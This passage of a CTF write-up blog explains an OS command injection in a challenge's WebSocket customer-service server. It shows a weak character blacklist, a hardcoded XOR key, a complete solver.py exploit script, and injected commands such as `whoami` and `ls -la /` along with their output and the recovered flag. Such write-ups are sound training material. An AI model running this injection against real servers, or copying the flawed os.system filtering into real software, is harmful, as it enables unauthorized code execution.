    <span class="token keyword">async</span> <span class="token keyword">for</span> message <span class="token keyword">in</span> websocket<span class="token punctuation">:</span>
        data <span class="token operator">=</span> KarenAgent<span class="token punctuation">.</span>xor_decrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        response <span class="token operator">=</span> KarenAgent<span class="token punctuation">.</span>handle_input<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">await</span> websocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>response<span class="token punctuation">)</span>

<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">async</span> <span class="token keyword">with</span> serve<span class="token punctuation">(</span>respond<span class="token punctuation">,</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>Future<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># run forever</span>

asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></span></code></pre><h3 id="https://www.notion.so/eab2ad97c90740f9a9ea8f43a7656e5d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/eab2ad97c90740f9a9ea8f43a7656e5d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">OS Command Injection in Customer Service WebSocket Agent</span></span></h3><div id="https://www.notion.so/e5ed022d2ef947489635c85f70f8be93" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Reading the extracted source code and the JavaScript on the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/customerservice</code></span><span class="SemanticString"> page, we learn the customer service module runs as a WebSocket server on </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ws://future-router.ctf.umasscybersec.org/app/</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/7abee7241848450099db41767c164f58" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> ws <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">ws:///</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>location<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/app/</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    ws<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        response_field<span class="token punctuation">.</span>innerText <span class="token operator">=</span> resp<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    agent_submit<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>agent_text<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        agent_text<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></span></span></span></code></pre><div id="https://www.notion.so/ff32a800425145cbb275e463198da4b9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">When the server receives a message, it will first try to decrypt the incoming messages by XOR‚Äôing the input with a hardcoded </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SECRET_KEY</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/c428c74b8b674c3d99342f51bcf50180" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>SECRET_KEY <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula."</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/f1c53edc01db43d2805ce66deb747ec8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then, the server will return a template response depending on what the decrypted message starts with. Specifically, if the decrypted message starts with ‚Äúkrabby patty‚Äù, it‚Äôll also first filter the message for blacklisted special characters, then echo the message into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dev/null</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/721f50f4491347a6a27ba2f210d11dd3" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">elif</span><span class="token punctuation">(</span><span class="token string">"krabby patty"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
    filtered_message <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"(\"|\'|\;|\&amp;|\|)"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'echo "</span><span class="token interpolation"><span class="token punctuation">{</span>filtered_message<span class="token punctuation">}</span></span><span class="token string">\n" >> /dev/null'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> self<span class="token punctuation">.</span>Dialogue<span class="token punctuation">[</span><span class="token string">"Secret formula"</span><span class="token punctuation">]</span></span></span></span></code></pre><div id="https://www.notion.so/ccdb163cb1404efc995588a4f495cc1d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking the blacklist, we notice that the list is incomplete and it is possible to inject additional OS commands into the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">os.system</code></span><span class="SemanticString"> line using command substitution characters (i.e. </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$(...)</code></span><span class="SemanticString"> or </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">`...`</code></span><span class="SemanticString">):</span></span></p></div><pre id="https://www.notion.so/1f361d2bcd274a87b4df675d3655add0" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>filtered_message <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"(\"|\'|\;|\&amp;|\|)"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span>message<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/01af230bacfe43ea83c2180642c57b97" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This can lead to remote code execution on the server. For example, the following decrypted message will cause the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">whoami</code></span><span class="SemanticString"> command to be run:</span></span></p></div><pre id="https://www.notion.so/cd5e3ce1eb1740668de183cfe9780e66" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>krabby patty `whoami`</span></span></span></code></pre><div id="https://www.notion.so/5a9924eb3f314d50b6f04bf427eaa4e2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Additionally, because XOR is commutative, we can ‚Äúencrypt‚Äù our forged messages by XOR‚Äôing it with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SECRET_KEY</code></span><span class="SemanticString">. Using the above information, we crafted a script to generate and send the WebSocket messages:</span></span></p></div><div id="https://www.notion.so/38686988f87d4203946a24a7b8d0d5ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">solver.py</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/6ed8aad32b9243d3a934ebd81dcf0076" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> asyncio
<span class="token keyword">from</span> websockets<span class="token punctuation">.</span>sync<span class="token punctuation">.</span>client <span class="token keyword">import</span> connect

SERVER_ADDR <span class="token operator">=</span> <span class="token string">"ws://future-router.ctf.umasscybersec.org/app/"</span>
SECRET_KEY <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token string">b"\xe1\x86\xb2\xa0_\x83B\xad\xd7\xaf\x87f\x1e\xb4\xcc\xbf...i will have the secret krabby patty formula."</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">xor_encrypt</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ciphertext <span class="token operator">=</span> <span class="token string">""</span>
    plain_arr <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>plain_arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ciphertext <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>plain_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> SECRET_KEY<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> ciphertext

<span class="token keyword">def</span> <span class="token function">send_msg</span><span class="token punctuation">(</span>address<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> connect<span class="token punctuation">(</span>SERVER_ADDR<span class="token punctuation">)</span> <span class="token keyword">as</span> websocket<span class="token punctuation">:</span>
        websocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
        message <span class="token operator">=</span> websocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Received: </span><span class="token interpolation"><span class="token punctuation">{</span>message<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: solver.py &lt;command>"</span><span class="token punctuation">)</span>
    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

cmd <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
msg <span class="token operator">=</span> xor_encrypt<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'krabby patty `</span><span class="token interpolation"><span class="token punctuation">{</span>cmd<span class="token punctuation">}</span></span><span class="token string">`'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
send_msg<span class="token punctuation">(</span>SERVER_ADDR<span class="token punctuation">,</span> msg<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/f5fcd37beef34c6681fccb314effbae7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This script takes a single argument as the command to be executed on the server. We‚Äôll test for command execution by executing </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">id</code></span><span class="SemanticString"> and redirecting the output to a file in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/tmp/pwned.txt</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/785fda8fb2ba4a6f869ce30c7ea3f43a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ./solver.py &quot;id &gt; /tmp/pwned.txt&quot;</code></span></span></p></div><pre id="https://www.notion.so/32a5c578eb4f49b893d6ad4d426f50ee" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Received: Thank you for your input, we will process your request in 1-3 business days</span></span></span></code></pre><div id="https://www.notion.so/7684ea2ce3f94721927a853c86292ab1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We get the standard boilerplate response, let‚Äôs check if the file has been created by reading </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/tmp/pwned</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/d62da4d72711489e81babecc83dc25c7" class="Image Image--PageWidth"><figure><a href="https://i.imgur.com/z5U3hhC.png?width=708"><img src="https://i.imgur.com/z5U3hhC.png?width=708" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><pre id="https://www.notion.so/b118f79c949045a8b55aeec493bcffb2" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">(</span>sheldonjplankton<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">(</span>sheldonjplankton<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1337</span><span class="token punctuation">(</span>sheldonjplankton<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/0ab880258c0e4dd1ad8c5efa01874407" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We can confirm we have arbitrary code execution on the server! Now all that‚Äôs left is to find the flag:</span></span></p></div><div id="https://www.notion.so/7af61ecca992418db58954790f5637b1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ ./solver.py &quot;ls -la / &gt; /tmp/pwned.txt&quot;</code></span></span></p></div><div id="https://www.notion.so/b4b4917a351341b99e8169923fd66a53" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///tmp/pwned.txt</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/829522a59d684750b3ed7d57a861aeb5" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>total 68
drwxr-xr-x   18 nobody           nogroup          4096 Apr 20 18:37 .
drwxr-xr-x   18 nobody           nogroup          4096 Apr 20 18:37 ..
lrwxrwxrwx    1 nobody           nogroup             7 Apr  8 00:00 bin -&gt; usr/bin
drwxr-xr-x    2 nobody           nogroup          4096 Jan 28 21:20 boot
drwxr-xr-x    5 nobody           nogroup           360 Apr 21 15:03 dev
-rwxr-xr-x    1 nobody           nogroup           513 Apr 20 17:49 entrypoint.sh
drwxr-xr-x   32 nobody           nogroup          4096 Apr 12 23:27 etc
-rw-r--r--    1 nobody           nogroup            46 Apr 12 23:27 flag53958e73c5ba4a66
drwxr-xr-x    2 nobody           nogroup          4096 Jan 28 21:20 home
lrwxrwxrwx    1 nobody           nogroup             7 Apr  8 00:00 lib -&gt; usr/lib
lrwxrwxrwx    1 nobody           nogroup             9 Apr  8 00:00 lib64 -&gt; usr/lib64
drwxr-xr-x    2 nobody           nogroup          4096 Apr  8 00:00 media
drwxr-xr-x    2 nobody           nogroup          4096 Apr  8 00:00 mnt
drwxr-xr-x    2 nobody           nogroup          4096 Apr  8 00:00 opt
drwxr-xr-x    6 nobody           nogroup          4096 Apr 20 17:50 planktonsrouter1ba8b69e
dr-xr-xr-x 3851 nobody           nogroup             0 Apr 21 15:03 proc
drwx------    3 nobody           nogroup          4096 Apr 12 23:27 root
drwxr-xr-x    3 nobody           nogroup          4096 Apr  8 00:00 run
lrwxrwxrwx    1 nobody           nogroup             8 Apr  8 00:00 sbin -&gt; usr/sbin
drwxr-xr-x    2 nobody           nogroup          4096 Apr  8 00:00 srv
drwxr-xr-x    2 nobody           nogroup          4096 Jan 28 21:20 sys
drwxrwxrwt    2 sheldonjplankton sheldonjplankton   80 Apr 21 17:06 tmp
drwxr-xr-x   12 nobody           nogroup          4096 Apr  8 00:00 usr
drwxr-xr-x   11 nobody           nogroup          4096 Apr  8 00:00 var</span></span></span></code></pre><div id="https://www.notion.so/48940ea930ed474d9fc74dd004fd3b66" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The flag is located in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/flag53958e73c5ba4a66</code></span><span class="SemanticString">, let‚Äôs read it:</span></span></p></div><div id="https://www.notion.so/7674a9f46d13411aad3b2baf65d61c2d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file:///flag53958e73c5ba4a66</code></span><span class="SemanticString">:</span></span></p></div><div id="https://www.notion.so/0cac626e07d443eba3329c48916d0284" class="Image Image--PageWidth"><figure><a href="https://i.imgur.com/1j9bPT8.png?width=708"><img src="https://i.imgur.com/1j9bPT8.png?width=708" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5e43a0e96136448da5b6c3a5718f53cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">We get the flag: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}</code></span></span></p></div><h3 id="https://www.notion.so/aa75ca6f52de4c5693a86f0795f87e68" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/aa75ca6f52de4c5693a86f0795f87e68"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Resources</span></span></h3><ol class="NumberedListWrapper"><li id="https://www.notion.so/c8ce464f20184db4a75e153af058f73e" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">websockets 12.0 documentation - </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://websockets.readthedocs.io/en/stable/">https://websockets.readthedocs.io/en/stable/</a></span></span><div id="https://www.notion.so/87797fd817c2480a8c75a93b03fe6ec6" class="Bookmark"><a href="https://websockets.readthedocs.io/en/stable/"><h5 class="Bookmark__Title">websockets</h5><p class="Bookmark__Desc">licence version pyversions tests docs openssf websockets is a library for building WebSocket servers and clients in Python with a focus on correctness, simplicity, robustness, and performance. It s...</p><p class="Bookmark__Link">https://websockets.readthedocs.io/en/stable/</p></a></div></li></ol></article>
  <footer class="Footer">
  <div>samiko@127.0.0.1~$</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank" rel="noopener noreferrer">Notablog</a>.</div>
</footer>
</body>

</html>